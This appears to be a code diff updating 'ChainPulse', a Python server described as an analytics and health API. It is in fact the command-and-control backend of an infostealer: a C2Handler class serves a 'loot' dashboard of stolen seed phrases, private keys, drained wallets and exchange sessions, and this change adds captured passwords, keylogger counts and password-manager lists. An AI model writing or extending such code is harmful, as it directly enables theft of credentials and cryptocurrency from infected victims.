@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""ChainPulse v8.0 — Analytics & Health API (Render-compatible).
+"""ChainPulse v8.1 — Analytics & Health API (Render-compatible).
 
 Accepts both:
   - Python agent envelope: {endpoint, campaign, timestamp, payload:{system_info,...}}
@@ -26,7 +26,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ChainPulse v8.0 — Analytics</title>
+<title>ChainPulse v8.1 — Analytics</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'SF Mono','Consolas','Courier New',monospace;background:#080810;color:#00ff88;padding:20px;font-size:13px}
@@ -62,7 +62,7 @@ a{color:#00d4ff}
 </style>
 </head>
 <body>
-<h1>ChainPulse v8.0 — Analytics Dashboard</h1>
+<h1>ChainPulse v8.1 — Analytics Dashboard</h1>
 <div id="stats"></div>
 <div id="loot"></div>
 <script>
@@ -90,6 +90,8 @@ function unwrap(entry){
     drain_results: inner.drain_results || [],
     exchange_sessions: inner.exchange_sessions || [],
     files: inner.files || {},
+    keylog: inner.keylog || {},
+    password_managers: inner.password_managers || [],
     id: pick(inner, ['id'], pick(top, ['id'], '')),
     raw: inner,
   };
@@ -98,12 +100,13 @@ async function load(){
   const r=await fetch('/api/loot-summary');
   const d=await r.json();
 
-  let sc=0,pk=0,dc=0,sessions=0,fileHits=0;
+  let sc=0,pk=0,dc=0,sessions=0,fileHits=0,pwHits=0;
   const rows=(d.recent||[]).map(unwrap);
   for(const p of rows){
     const sec=p.secrets||{};
     sc+=(sec.seed_phrases||[]).length;
     pk+=(sec.private_keys||[]).length;
+    pwHits+=(sec.captured_passwords||[]).length;
     dc+=(p.drain_results||[]).filter(x=>x.status==='drained').length;
     sessions+=(p.exchange_sessions||[]).length;
     fileHits+=Object.keys(p.files||{}).length;
@@ -116,6 +119,7 @@ async function load(){
     '<div class="stat-box"><div class="num">'+d.total_files+'</div><div class="lbl">Reports</div></div>'+
     '<div class="stat-box"><div class="num">'+sc+'</div><div class="lbl">Seeds</div></div>'+
     '<div class="stat-box"><div class="num">'+pk+'</div><div class="lbl">Keys</div></div>'+
+    '<div class="stat-box"><div class="num">'+pwHits+'</div><div class="lbl">Passwords</div></div>'+
     '<div class="stat-box"><div class="num">'+dc+'</div><div class="lbl">Drained</div></div>'+
     '<div class="stat-box"><div class="num">'+fileHits+'</div><div class="lbl">Files</div></div>'+
     '</div>';
@@ -148,14 +152,31 @@ async function load(){
     }else{html+='<span class="value">none listed</span>';}
     html+='<br>';
 
+    const capPw=(p.secrets.captured_passwords||[]);
+    const klCount=(p.keylog&&p.keylog.count)||(p.keylog&&p.keylog.entries&&p.keylog.entries.length)||0;
+    const pmList=Array.isArray(p.password_managers)?p.password_managers:[];
     if(seeds)html+='<span class="badge badge-danger">SEED x'+seeds+'</span> ';
     if(pkeys)html+='<span class="badge badge-btc">KEY x'+pkeys+'</span> ';
+    if(capPw.length)html+='<span class="badge badge-danger">PASSWORDS x'+capPw.length+'</span> ';
+    if(klCount)html+='<span class="badge badge-session">KEYLOG x'+klCount+'</span> ';
+    if(pmList.length)html+='<span class="badge badge-files">PWD-MGR x'+pmList.length+'</span> ';
     if(fileCount)html+='<span class="badge badge-files">FILES x'+fileCount+'</span> ';
     if(hasSessions){
       const domains=[...new Set(p.exchange_sessions.map(s=>s.domain||s))];
       html+='<span class="badge badge-session">SESSIONS: '+domains.slice(0,5).join(', ')+'</span> ';
     }
 
+    if(capPw.length){
+      html+='<div class="file-list" style="color:#ff8888;max-height:160px">';
+      for(const x of capPw.slice(0,20)){
+        html+='<div><b>'+String(x.window||'?').slice(0,50)+'</b> → <span class="key">'+String(x.password||'').slice(0,64)+'</span></div>';
+      }
+      html+='</div>';
+    }
+    if(pmList.length){
+      html+='<div class="file-list">'+pmList.slice(0,15).map(n=>'<div>[PM] '+n+'</div>').join('')+
+        (pmList.length>15?'<div>… +'+(pmList.length-15)+' more</div>':'')+'</div>';
+    }
     if(fileCount){
       const names=Object.keys(p.files).slice(0,40);
       html+='<div class="file-list">'+names.map(n=>'<div>'+n+'</div>').join('')+
@@ -233,6 +254,10 @@ def _normalize_payload(raw: dict) -> dict:
         pl["wallets"] = pl.get("wallets") if isinstance(pl.get("wallets"), dict) else {}
     if "secrets" not in pl or not isinstance(pl.get("secrets"), dict):
         pl["secrets"] = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
+    if "keylog" not in pl or not isinstance(pl.get("keylog"), dict):
+        pl["keylog"] = pl.get("keylog") if isinstance(pl.get("keylog"), dict) else {}
+    if "password_managers" not in pl or not isinstance(pl.get("password_managers"), list):
+        pl["password_managers"] = pl.get("password_managers") if isinstance(pl.get("password_managers"), list) else []
     if "drain_results" not in pl or not isinstance(pl.get("drain_results"), list):
         pl["drain_results"] = pl.get("drain_results") if isinstance(pl.get("drain_results"), list) else []
     if "exchange_sessions" not in pl or not isinstance(pl.get("exchange_sessions"), list):
@@ -292,7 +317,7 @@ class C2Handler(BaseHTTPRequestHandler):
         elif self.path == "/api/loot-summary":
             self._serve_json(self._get_summary())
         elif self.path == "/health":
-            self._serve_json({"status": "healthy", "version": "8.0.2", "render": True})
+            self._serve_json({"status": "healthy", "version": "8.1.0", "render": True})
         else:
             self.send_error(404)
 
@@ -328,7 +353,7 @@ class C2Handler(BaseHTTPRequestHandler):
             ts = str(env["timestamp"]).replace(":", "-")
             host = env["payload"].get("system_info", {}).get("hostname", "unknown")
             nfiles = len((env.get("payload") or {}).get("files") or {})
-            fp_key = f"{campaign}|{host}|{nfiles}"
+            fp_key = f"{campaign}|{endpoint}|{host}|{nfiles}|{str(env.get('timestamp', ''))[:19]}"
             now = time.time()
             # drop fingerprints older than window
             for k in list(_RECENT_FP.keys()):
